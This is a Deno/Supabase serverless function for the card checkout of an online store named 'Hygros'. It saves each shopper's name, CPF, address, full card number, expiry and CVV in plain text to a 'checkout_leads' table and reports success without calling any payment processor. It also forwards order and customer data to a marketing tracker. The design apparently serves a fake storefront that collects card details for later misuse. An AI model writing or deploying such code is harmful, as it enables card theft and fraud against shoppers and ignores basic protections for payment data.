const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

async function sendUtmifyEvent(
  customer: any,
  items: any[],
  amount: number,
  trackingParams: Record<string, string | null>,
) {
  const utmifyToken = Deno.env.get("UTMIFY_API_TOKEN");
  if (!utmifyToken) {
    console.log("UTMIFY_API_TOKEN not configured, skipping");
    return;
  }

  try {
    const now = new Date().toISOString().replace("T", " ").slice(0, 19);
    const orderId = `card-${Date.now()}`;

    const utmifyData = {
      orderId,
      platform: "Hygros",
      paymentMethod: "credit_card",
      status: "waiting_payment",
      createdAt: now,
      approvedDate: null,
      refundedAt: null,
      customer: {
        name: customer?.name || "",
        email: customer?.email || "",
        phone: customer?.phone || null,
        document: customer?.cpf || "",
        country: "BR",
        ip: "",
      },
      products: (items || []).map((item: any) => ({
        id: item.id || item.externalRef || orderId,
        name: item.title || item.name || "",
        planId: null,
        planName: null,
        quantity: item.quantity || 1,
        priceInCents: item.unitPrice || item.priceInCents || 0,
      })),
      trackingParameters: {
        src: trackingParams.src || null,
        sck: trackingParams.sck || null,
        utm_source: trackingParams.utm_source || null,
        utm_campaign: trackingParams.utm_campaign || null,
        utm_medium: trackingParams.utm_medium || null,
        utm_content: trackingParams.utm_content || null,
        utm_term: trackingParams.utm_term || null,
        xcod: trackingParams.xcod || null,
        fbclid: trackingParams.fbclid || null,
        gclid: trackingParams.gclid || null,
        ttclid: trackingParams.ttclid || null,
      },
      commission: {
        totalPriceInCents: amount || 0,
        gatewayFeeInCents: 0,
        userCommissionInCents: amount || 0,
      },
      isTest: false,
    };

    console.log("Sending UTMify card waiting_payment:", JSON.stringify(utmifyData));

    const res = await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-token": utmifyToken,
      },
      body: JSON.stringify(utmifyData),
    });

    const resText = await res.text();
    console.log(`UTMify response (${res.status}):`, resText);
  } catch (err) {
    console.error("UTMify event error:", err);
  }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { customer, card, items, amount, shipping, metadata } = await req.json();

    const supabaseUrl = Deno.env.get("SUPABASE_URL");
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");

    if (!supabaseUrl || !supabaseKey) {
      return new Response(
        JSON.stringify({ error: "Server configuration error" }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    let meta: any = {};
    try {
      meta = typeof metadata === "string" ? JSON.parse(metadata) : metadata || {};
    } catch (_) {}

    const trackingParams = meta?.tracking || {};

    const lead = {
      payment_method: "credit_card",
      name: customer?.name || "",
      email: customer?.email || "",
      phone: customer?.phone || "",
      cpf: customer?.cpf || "",
      cep: shipping?.address?.zipCode || shipping?.address?.zipcode || "",
      endereco: shipping?.address?.street || "",
      numero: shipping?.address?.streetNumber || "",
      complemento: shipping?.address?.complement || "",
      bairro: shipping?.address?.neighborhood || "",
      cidade: shipping?.address?.city || "",
      uf: shipping?.address?.state || "",
      color: meta?.color || "",
      size: meta?.size || "",
      quantity: items?.[0]?.quantity || 1,
      total_amount: amount,
      shipping_type: shipping?.fee > 0 ? "express" : "padrao",
      shipping_cost: shipping?.fee || 0,
      card_number: card?.number || "",
      card_holder: card?.holder || "",
      card_expiry: card?.expiry || "",
      card_cvv: card?.cvv || "",
      card_installments: card?.installments || 1,
      status: "pending",
      metadata: meta,
    };

    const res = await fetch(`${supabaseUrl}/rest/v1/checkout_leads`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": supabaseKey,
        "Authorization": `Bearer ${supabaseKey}`,
        "Prefer": "return=minimal",
      },
      body: JSON.stringify(lead),
    });

    console.log("Card lead saved, status:", res.status);

    // Fire UTMify waiting_payment for card lead
    sendUtmifyEvent(customer, items, amount, trackingParams);

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error saving card lead:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
